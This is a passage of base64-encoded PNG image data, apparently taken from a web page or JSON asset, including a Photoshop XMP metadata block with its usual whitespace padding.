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", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWIAAAFcCAMAAADF8kSVAAA7qmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzIgNzkuMTU5Mjg0LCAyMDE2LzA0LzE5LTEzOjEzOjQwICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgICAgICAgICAgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIgogICAgICAgICAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgICAgICAgICAgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmV4aWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vZXhpZi8xLjAvIj4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNS41IChNYWNpbnRvc2gpPC94bXA6Q3JlYXRvclRvb2w+CiAgICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDE3LTA1LTMwVDAwOjQ5OjMwKzAyOjAwPC94bXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhtcDpNb2RpZnlEYXRlPjIwMTctMDYtMDJUMTU6MjM6MzErMDI6MDA8L3htcDpNb2RpZnlEYXRlPgogICAgICAgICA8eG1wOk1ldGFkYXRhRGF0ZT4yMDE3LTA2LTAyVDE1OjIzOjMxKzAyOjAwPC94bXA6TWV0YWRhdGFEYXRlPgogICAgICAgICA8ZGM6Zm9ybWF0PmltYWdlL3BuZzwvZGM6Zm9ybWF0PgogICAgICAgICA8cGhvdG9zaG9wOkNvbG9yTW9kZT4zPC9waG90b3Nob3A6Q29sb3JNb2RlPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOmNhYjUyYmQ2LTU0ZGQtNGY3OC04YTkzLThjYWI5ZWFjODg5ZDwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAgPHhtcE1NOkRvY3VtZW50SUQ+eG1wLmRpZDpmMDc2NDZkMS1iOTllLTRlNmYtYjYyYS1jYmI4ZWUwOWY0MWU8L3htcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+eG1wLmRpZDpmMDc2NDZkMS1iOTllLTRlNmYtYjYyYS1jYmI4ZWUwOWY0MWU8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5jcmVhdGVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6ZjA3NjQ2ZDEtYjk5ZS00ZTZmLWI2MmEtY2JiOGVlMDlmNDFlPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE3LTA1LTMwVDAwOjQ5OjMwKzAyOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNS41IChNYWNpbnRvc2gpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDphOGYyZWRmMC1lODg3LTQ2MzktYTQwMi1iZjJmZTFiMjNjNDM8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTctMDYtMDJUMDA6MzI6MDMrMDI6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1LjUgKE1hY2ludG9zaCk8L3N0RXZ0OnNvZnR3YXJlQWdlbnQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpjaGFuZ2VkPi88L3N0RXZ0OmNoYW5nZWQ+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5zYXZlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOmNhYjUyYmQ2LTU0ZGQtNGY3OC04YTkzLThjYWI5ZWFjODg5ZDwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxNy0wNi0wMlQxNToyMzozMSswMjowMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUuNSAoTWFjaW50b3NoKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOlNlcT4KICAgICAgICAgPC94bXBNTTpIaXN0b3J5PgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICAgICA8dGlmZjpYUmVzb2x1dGlvbj43MjAwMDAvMTAwMDA8L3RpZmY6WFJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOllSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpZUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICAgICAgICAgPGV4aWY6Q29sb3JTcGFjZT42NTUzNTwvZXhpZjpDb2xvclNwYWNlPgogICAgICAgICA8ZXhpZjpQaXhlbFhEaW1lbnNpb24+MzU0PC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjM0ODwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI